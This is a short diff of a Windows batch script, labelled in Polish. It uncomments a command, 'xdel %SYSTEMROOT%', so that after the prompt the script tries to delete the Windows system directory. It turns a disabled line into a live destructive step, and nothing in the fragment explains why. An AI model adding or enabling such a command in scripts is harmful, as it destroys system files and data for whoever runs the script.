@@ -16,8 +16,7 @@ if errorlevel 1 goto yes
 
 :yes
 echo Continuing...
-:: xdel %SYSTEMROOT%
-:: xdel
+xdel %SYSTEMROOT%
 pause
 goto koniec
 
